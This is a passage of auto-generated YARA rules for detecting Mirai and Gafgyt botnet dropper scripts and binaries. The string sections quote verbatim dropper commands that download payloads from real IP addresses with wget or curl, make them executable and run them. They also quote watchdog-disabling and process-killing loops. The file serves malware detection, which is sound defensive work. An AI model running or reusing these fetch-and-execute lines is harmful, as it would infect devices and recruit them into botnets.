      $s1 = "(wget http://158.51.126.131/a/armv5l -O- || busybox wget http://158.51.126.131/a/armv5l -O-) > .f; chmod 777 .f; ./.f asus2" fullword ascii /* score: '28.00'*/
      $s2 = "(wget http://158.51.126.131/a/mipsel -O- || busybox wget http://158.51.126.131/a/mipsel -O-) > .f; chmod 777 .f; ./.f asus2" fullword ascii /* score: '28.00'*/
      $s3 = "(wget http://158.51.126.131/a/mips -O- || busybox wget http://158.51.126.131/a/mips -O-) > .f; chmod 777 .f; ./.f asus2" fullword ascii /* score: '28.00'*/
      $s4 = "(wget http://158.51.126.131/a/armv4l -O- || busybox wget http://158.51.126.131/a/armv4l -O-) > .f; chmod 777 .f; ./.f asus2" fullword ascii /* score: '28.00'*/
      $s5 = "(wget http://158.51.126.131/a/armv7l -O- || busybox wget http://158.51.126.131/a/armv7l -O-) > .f; chmod 777 .f; ./.f asus2" fullword ascii /* score: '28.00'*/
      $s6 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s7 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s8 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s9 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s10 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s11 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s12 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s13 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s14 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
      $s15 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 3KB and
      8 of them
}

rule Ga_gyt_signature__4460c092 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_4460c092.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4460c092e6322b4816583cafaefe7ed35af92bac27a0c5e89651f04722e91d29"
   strings:
      $x1 = "(wget http://158.51.126.131/a/mipsel -O- || busybox wget http://158.51.126.131/a/mipsel -O-) > .f; chmod 777 .f; ./.f brickcom" fullword ascii /* score: '31.00'*/
      $x2 = "(wget http://158.51.126.131/a/armv4l -O- || busybox wget http://158.51.126.131/a/armv4l -O-) > .f; chmod 777 .f; ./.f brickcom" fullword ascii /* score: '31.00'*/
      $x3 = "(wget http://158.51.126.131/a/armv5l -O- || busybox wget http://158.51.126.131/a/armv5l -O-) > .f; chmod 777 .f; ./.f brickcom" fullword ascii /* score: '31.00'*/
      $x4 = "(wget http://158.51.126.131/a/armv7l -O- || busybox wget http://158.51.126.131/a/armv7l -O-) > .f; chmod 777 .f; ./.f brickcom" fullword ascii /* score: '31.00'*/
      $x5 = "(wget http://158.51.126.131/a/mips -O- || busybox wget http://158.51.126.131/a/mips -O-) > .f; chmod 777 .f; ./.f brickcom" fullword ascii /* score: '31.00'*/
      $s6 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s7 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s8 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s9 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s10 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s11 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s12 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s13 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s14 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
      $s15 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 3KB and
      1 of ($x*) and all of them
}

rule Ga_gyt_signature__7a7b856c {
   meta:
      description = "dropzone - file Ga-gyt(signature)_7a7b856c.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7a7b856c118fa42d7e199384f978635428af34556e2fdec10e8383ad656de527"
   strings:
      $x1 = "(wget http://158.51.126.131/a/armv7l -O- || busybox wget http://158.51.126.131/a/armv7l -O-) > .f; chmod 777 .f; ./.f syscmd" fullword ascii /* score: '31.00'*/
      $x2 = "(wget http://158.51.126.131/a/mips -O- || busybox wget http://158.51.126.131/a/mips -O-) > .f; chmod 777 .f; ./.f syscmd" fullword ascii /* score: '31.00'*/
      $x3 = "(wget http://158.51.126.131/a/mipsel -O- || busybox wget http://158.51.126.131/a/mipsel -O-) > .f; chmod 777 .f; ./.f syscmd" fullword ascii /* score: '31.00'*/
      $x4 = "(wget http://158.51.126.131/a/armv5l -O- || busybox wget http://158.51.126.131/a/armv5l -O-) > .f; chmod 777 .f; ./.f syscmd" fullword ascii /* score: '31.00'*/
      $s5 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s6 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s7 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s8 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s9 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s10 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s11 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s12 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s13 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
      $s14 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule Ga_gyt_signature__c877ef9d {
   meta:
      description = "dropzone - file Ga-gyt(signature)_c877ef9d.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c877ef9df4d1b8456df674ec4c95b72ba20417dfef2222f831d28cc3860bf7f3"
   strings:
      $s1 = "(wget http://158.51.126.131/a/mips -O- || busybox wget http://158.51.126.131/a/mips -O-) > .f; chmod 777 .f; ./.f scan.faith" fullword ascii /* score: '29.00'*/
      $s2 = "(wget http://158.51.126.131/a/mipsel -O- || busybox wget http://158.51.126.131/a/mipsel -O-) > .f; chmod 777 .f; ./.f scan.faith" ascii /* score: '29.00'*/
      $s3 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s4 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s5 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s6 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s7 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s8 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s9 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s10 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s11 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
      $s12 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__7a14b327 {
   meta:
      description = "dropzone - file Mirai(signature)_7a14b327.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7a14b3271df3153b79aa0388631d3b2876fc7fbbd28b2dc63ddecaa22f239e4b"
   strings:
      $s1 = "(wget http://158.51.126.131/v/mips -O- || busybox wget http://158.51.126.131/v/mips -O-) > .f; chmod 777 .f; ./.f greenpacket" fullword ascii /* score: '28.00'*/
      $s2 = "(wget http://158.51.126.131/v/armv4l -O- || busybox wget http://158.51.126.131/v/armv4l -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s3 = "(wget http://158.51.126.131/v/armv5l -O- || busybox wget http://158.51.126.131/v/armv5l -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s4 = "(wget http://158.51.126.131/v/armv7l -O- || busybox wget http://158.51.126.131/v/armv7l -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s5 = "(wget http://158.51.126.131/v/armv4l -O- || busybox wget http://158.51.126.131/v/armv4l -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s6 = "(wget http://158.51.126.131/v/mipsel -O- || busybox wget http://158.51.126.131/v/mipsel -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s7 = "(wget http://158.51.126.131/v/mipsel -O- || busybox wget http://158.51.126.131/v/mipsel -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s8 = "(wget http://158.51.126.131/v/armv7l -O- || busybox wget http://158.51.126.131/v/armv7l -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s9 = "(wget http://158.51.126.131/v/armv5l -O- || busybox wget http://158.51.126.131/v/armv5l -O-) > .f; chmod 777 .f; ./.f greenpacke" ascii /* score: '28.00'*/
      $s10 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s11 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s12 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s13 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s14 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s15 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__9f5017e6 {
   meta:
      description = "dropzone - file Mirai(signature)_9f5017e6.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9f5017e6929320444819c15a920952dbf85a7938807f1f882d338837b5566dae"
   strings:
      $s1 = "(wget http://158.51.126.131/a/armv4l -O- || busybox wget http://158.51.126.131/a/armv4l -O-) > .f; chmod 777 .f; ./.f scan.avtec" ascii /* score: '29.00'*/
      $s2 = "(wget http://158.51.126.131/a/armv7l -O- || busybox wget http://158.51.126.131/a/armv7l -O-) > .f; chmod 777 .f; ./.f scan.avtec" ascii /* score: '29.00'*/
      $s3 = "(wget http://158.51.126.131/a/armv5l -O- || busybox wget http://158.51.126.131/a/armv5l -O-) > .f; chmod 777 .f; ./.f scan.avtec" ascii /* score: '29.00'*/
      $s4 = "(wget http://158.51.126.131/a/armv4l -O- || busybox wget http://158.51.126.131/a/armv4l -O-) > .f; chmod 777 .f; ./.f scan.avtec" ascii /* score: '29.00'*/
      $s5 = "(wget http://158.51.126.131/a/armv5l -O- || busybox wget http://158.51.126.131/a/armv5l -O-) > .f; chmod 777 .f; ./.f scan.avtec" ascii /* score: '29.00'*/
      $s6 = "(wget http://158.51.126.131/a/armv7l -O- || busybox wget http://158.51.126.131/a/armv7l -O-) > .f; chmod 777 .f; ./.f scan.avtec" ascii /* score: '29.00'*/
      $s7 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s8 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s9 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s10 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s11 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s12 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s13 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s14 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s15 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__b2c96866 {
   meta:
      description = "dropzone - file Mirai(signature)_b2c96866.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b2c96866f5b990bfdcbcf07c913a4a0b99da60e56ee80753d0c3d1097f4ee578"
   strings:
      $s1 = "(curl http://158.51.126.131/v/armv5l -o- || busybox curl http://158.51.126.131/v/armv5l -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s2 = "(curl http://158.51.126.131/v/armv4l -o- || busybox curl http://158.51.126.131/v/armv4l -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s3 = "(curl http://158.51.126.131/v/mipsel -o- || busybox curl http://158.51.126.131/v/mipsel -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s4 = "(curl http://158.51.126.131/v/mips -o- || busybox curl http://158.51.126.131/v/mips -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s5 = "(curl http://158.51.126.131/v/armv7l -o- || busybox curl http://158.51.126.131/v/armv7l -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s6 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s7 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s8 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s9 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s10 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s11 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s12 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s13 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s14 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      8 of them
}

rule Mirai_signature__faa8b82a {
   meta:
      description = "dropzone - file Mirai(signature)_faa8b82a.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "faa8b82a080dec0ae57f7737a6966a20606fbd0aa5a2da73fa34e615df3147ef"
   strings:
      $s1 = "(wget http://158.51.126.131/a/armv7l -O- || busybox wget http://158.51.126.131/a/armv7l -O-) > .f; chmod 777 .f; ./.f scan.weed" fullword ascii /* score: '29.00'*/
      $s2 = "(wget http://158.51.126.131/a/armv5l -O- || busybox wget http://158.51.126.131/a/armv5l -O-) > .f; chmod 777 .f; ./.f scan.weed" fullword ascii /* score: '29.00'*/
      $s3 = "(wget http://158.51.126.131/a/armv4l -O- || busybox wget http://158.51.126.131/a/armv4l -O-) > .f; chmod 777 .f; ./.f scan.weed" fullword ascii /* score: '29.00'*/
      $s4 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s5 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s6 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s7 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s8 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s9 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s10 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s11 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s12 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
      $s13 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__a0412e1b {
   meta:
      description = "dropzone - file Mirai(signature)_a0412e1b.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a0412e1b5ffb39535e98af7bf1118edafc290950f4e8e6b950905c8714578c7c"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s4 = "/home/firmware/build/temp-armv5l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__daf526aa {
   meta:
      description = "dropzone - file Mirai(signature)_daf526aa.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "daf526aaf88b04ac0a046fcc5e1de4d13f57a35fe525b4fcc909d63fcfd812c9"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "/home/firmware/build/temp-armv4l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s4 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s5 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii /* score: '11.00'*/
      $s6 = ".//////////////22///" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
      $s7 = ".///3/2///////////////////0//0////" fullword ascii /* score: '9.00'*/ /* hex encoded string '2' */
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__7715522e {
   meta:
      description = "dropzone - file Mirai(signature)_7715522e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7715522e127200b11414fdcb56e50b61fcde115fa124bc0287c92ff81eb0ca78"
   strings:
      $s1 = "__stdio_mutex_initializer.3860" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-sparc/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s3 = "/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii /* score: '11.00'*/
      $s4 = "/home/firmware/build/temp-sparc/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s5 = "estridx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__9a647936 {
   meta:
      description = "dropzone - file Mirai(signature)_9a647936.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9a64793664809d33c338753c00f4958f8656241ff66c69ec8e8b143843aa484b"
   strings:
      $s1 = "__stdio_mutex_initializer.3812" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Ga_gyt_signature__24368a39 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_24368a39.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "24368a39bc657f616e03a3a25fb3de3e33fe5901e582bf6b39ed7bd532fca87a"
   strings:
      $s1 = "cp /bin/busybox busybox; busybox wget http://103.176.20.59/skid.arm    -O- > XKJDSA; chmod 777 XKJDSA; ./XKJDSA selfrep.wget" fullword ascii /* score: '29.00'*/
      $s2 = "cp /bin/busybox busybox; busybox wget http://103.176.20.59/skid.arm5    -O- > PRTQWE; chmod 777 PRTQWE; ./PRTQWE selfrep.wget" fullword ascii /* score: '26.00'*/
      $s3 = "cp /bin/busybox busybox; busybox wget http://103.176.20.59/skid.arm7    -O- > AFGHTY; chmod 777 AFGHTY; ./AFGHTY selfrep.wget" fullword ascii /* score: '26.00'*/
      $s4 = "cp /bin/busybox busybox; busybox wget http://103.176.20.59/mips    -O- > NVBXUE; chmod 777 NVBXUE; ./NVBXUE selfrep.wget" fullword ascii /* score: '26.00'*/
      $s5 = "cp /bin/busybox busybox; busybox wget http://103.176.20.59/mpsl    -O- > WLOPKJ; chmod 777 WLOPKJ; ./WLOPKJ selfrep.wget" fullword ascii /* score: '26.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "/bin/busybox mount -o bind,remount,ro \"$dir\"" fullword ascii /* score: '15.00'*/
      $s8 = "# lol fuck you ducky watch me" fullword ascii /* score: '13.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s13 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__20046a35 {
   meta:
      description = "dropzone - file Mirai(signature)_20046a35.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "20046a35f56d3a6905eb9a3f1ad17631ce1a26d3c7049a7f5aeb13164547fe47"
   strings:
      $s1 = "wget http://46.23.108.231/mpsl || busybox wget http://46.23.108.231/mpsl; chmod 777 mpsl; ./mpsl massload;" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://46.23.108.231/arm7 || busybox wget http://46.23.108.231/arm7; chmod 777 arm7; ./arm7 massload;" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://46.23.108.231/mips || busybox wget http://46.23.108.231/mips; chmod 777 mips; ./mips massload;" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://46.23.108.231/arm4 || busybox wget http://46.23.108.231/arm4; chmod 777 arm4; ./arm4 massload;" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://46.23.108.231/arm5 || busybox wget http://46.23.108.231/arm5; chmod 777 arm5; ./arm5 massload;" fullword ascii /* score: '20.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s8 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s11 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s12 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s13 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__331027ed {
   meta:
      description = "dropzone - file Mirai(signature)_331027ed.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "331027ed453f9de1d2640644a421b727408dddc443db65076e7d91fedc51e09c"
   strings:
      $s1 = "wget http://103.176.20.59/skid.arm || busybox wget http://103.176.20.59/skid.arm; chmod 777 skid.arm; ./skid.arm tplinkcat;" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://103.176.20.59/skid.mips || busybox wget http://103.176.20.59/skid.mips; chmod 777 skid.mips; ./skid.mips tplinkcat;" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://103.176.20.59/skid.mpsl || busybox wget http://103.176.20.59/skid.mpsl; chmod 777 skid.mpsl; ./skid.mpsl tplinkcat;" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://103.176.20.59/x86 || busybox wget http://103.176.20.59/x86; chmod 777 skid.arm7; ./x86 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://103.176.20.59/skid.arm7 || busybox wget http://103.176.20.59/skid.arm7; chmod 777 skid.arm7; ./skid.arm7 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://103.176.20.59/skid.arm5 || busybox wget http://103.176.20.59/skid.arm5; chmod 777 skid.arm5; ./skid.arm5 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s7 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s8 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s14 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s15 = "rm skid.mips skid.mpsl arm* x86" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__b21e86bf {
   meta:
      description = "dropzone - file Mirai(signature)_b21e86bf.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b21e86bfaa99a9edf92af34f794f9fcfbe2c13e2a39497bf6558055854ab2186"
   strings:
      $s1 = "wget http://103.176.20.59/skid.arm || busybox wget http://103.176.20.59/skid.arm; chmod 777 skid.arm; ./skid.arm tplinkcat;" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://103.176.20.59/x86 || busybox wget http://103.176.20.59/x86; chmod 777 skid.arm7; ./x86 tplinkcat;" fullword ascii /* score: '16.00'*/
